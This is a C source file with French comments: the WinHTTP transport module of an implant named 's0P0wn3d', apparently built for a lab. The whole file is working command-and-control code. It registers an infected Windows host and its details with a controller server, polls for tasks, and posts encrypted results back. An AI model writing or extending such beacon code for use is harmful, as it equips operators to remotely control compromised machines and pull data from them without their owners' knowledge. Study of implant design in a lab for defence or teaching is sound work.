/*
 * s0P0wn3d — Implémentation du transport (WinHTTP).
 *
 * Utilise l'API WinHTTP native de Windows pour les communications HTTP.
 */

#include "transport.h"
#include "../shared/json.h"
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static HINTERNET hSession = NULL;
static HINTERNET hConnect = NULL;
static char controller_host[256] = {0};
static int controller_port = 0;

int transport_init(const char *host, int port) {
    strncpy(controller_host, host, sizeof(controller_host) - 1);
    controller_port = port;

    hSession = WinHttpOpen(L"s0P0wn3d/0.1",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "[-] WinHttpOpen échoué: %lu\n", GetLastError());
        return -1;
    }

    /* Convertir le host en wide string */
    wchar_t whost[256] = {0};
    MultiByteToWideChar(CP_UTF8, 0, controller_host, -1, whost, 255);

    hConnect = WinHttpConnect(hSession, whost,
                              (INTERNET_PORT)controller_port, 0);
    if (!hConnect) {
        fprintf(stderr, "[-] WinHttpConnect échoué: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return -1;
    }

    return 0;
}

/* Helper : effectue une requête HTTP et récupère la réponse. */
static char *http_request(const wchar_t *method, const wchar_t *path,
                          const char *body, size_t body_len) {
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, method, path,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0  /* HTTP (pas HTTPS pour le lab) */
    );
    if (!hRequest) return NULL;

    BOOL result;
    if (body && body_len > 0) {
        wchar_t headers[256];
        swprintf(headers, 256,
            L"Content-Type: application/json\r\n"
            L"Content-Length: %zu\r\n",
            body_len);
        result = WinHttpSendRequest(hRequest, headers, (DWORD)-1,
                                    (LPVOID)body, (DWORD)body_len,
                                    (DWORD)body_len, 0);
    } else {
        result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }

    if (!result) {
        WinHttpCloseHandle(hRequest);
        return NULL;
    }

    result = WinHttpReceiveResponse(hRequest, NULL);
    if (!result) {
        WinHttpCloseHandle(hRequest);
        return NULL;
    }

    /* Lire la réponse */
    DWORD available = 0;
    DWORD total_read = 0;
    char *response = malloc(1);
    response[0] = '\0';

    do {
        available = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &available)) break;
        if (available == 0) break;

        char *chunk = malloc(available + 1);
        if (!chunk) break;

        DWORD bytes_read = 0;
        if (WinHttpReadData(hRequest, chunk, available, &bytes_read)) {
            chunk[bytes_read] = '\0';
            char *new_response = realloc(response, total_read + bytes_read + 1);
            if (new_response) {
                response = new_response;
                memcpy(response + total_read, chunk, bytes_read);
                total_read += bytes_read;
                response[total_read] = '\0';
            }
        }
        free(chunk);
    } while (available > 0);

    WinHttpCloseHandle(hRequest);

    if (total_read == 0) {
        free(response);
        return NULL;
    }

    return response;
}

char *transport_get_pubkey(void) {
    return http_request(L"GET", L"/pubkey", NULL, 0);
}

char *transport_register(const char *encrypted_key_b64,
                          const host_info_t *host) {
    char *body = json_build_register(encrypted_key_b64, host);
    if (!body) return NULL;

    char *response = http_request(L"POST", L"/register", body, strlen(body));
    free(body);

    if (!response) return NULL;

    /* Extraire session_id de la réponse JSON */
    char *session_id = json_extract_string(response, "session_id");
    free(response);
    return session_id;
}

char *transport_fetch_tasks(const char *session_id) {
    wchar_t path[512];
    swprintf(path, 512, L"/tasks/%hs", session_id);
    return http_request(L"GET", path, NULL, 0);
}

int transport_submit_result(const char *session_id,
                             const char *nonce_b64,
                             const char *payload_b64,
                             const char *tag_b64) {
    /* Construire le body JSON */
    char *body = malloc(S0P_MAX_PAYLOAD);
    if (!body) return -1;
    snprintf(body, S0P_MAX_PAYLOAD,
        "{\"session_id\":\"%s\",\"nonce\":\"%s\",\"payload\":\"%s\",\"tag\":\"%s\"}",
        session_id, nonce_b64, payload_b64, tag_b64);

    wchar_t path[512];
    swprintf(path, 512, L"/results/%hs", session_id);

    char *response = http_request(L"POST", path, body, strlen(body));
    free(body);

    if (response) {
        free(response);
        return 0;
    }
    return -1;
}

void transport_cleanup(void) {
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}
